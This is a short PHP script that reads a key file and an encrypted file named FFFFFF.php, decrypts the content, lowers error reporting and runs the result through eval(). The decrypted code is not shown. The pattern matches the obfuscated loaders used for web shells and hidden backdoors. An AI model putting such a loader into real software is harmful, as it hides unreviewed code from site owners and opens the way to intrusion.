<?php

include_once 'methods/encryptor3.php';

$key = file_get_contents(dirname(__FILE__).'/methods/key_file.txt');

$method = file_get_contents(dirname(__FILE__).'/methods/FFFFFF.php');

$code_to_exec = decryptor3($key, $method);

error_reporting(E_ERROR | E_PARSE);

eval($code_to_exec);